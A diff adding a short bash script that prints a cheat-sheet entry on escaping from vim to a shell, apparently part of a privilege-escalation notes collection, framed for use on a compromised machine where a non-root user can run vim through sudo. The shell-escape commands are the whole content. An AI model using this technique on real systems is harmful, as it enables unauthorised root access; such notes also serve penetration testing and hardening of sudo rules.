@@ -1,0 +1,19 @@
+#!/bin/bash
+
+echo "
+-------------
+--- Command
+-------------
+
+    vim --cmd ':set shell=/bin/sh|:shell'
+or
+    1. vim <file>
+    2. :set shell=/bin/sh
+    3. :shell
+
+-------------
+--- Details
+-------------
+This can be executed on a compromised machine if a non-root user has sudo 
+access to the vim command.
+"
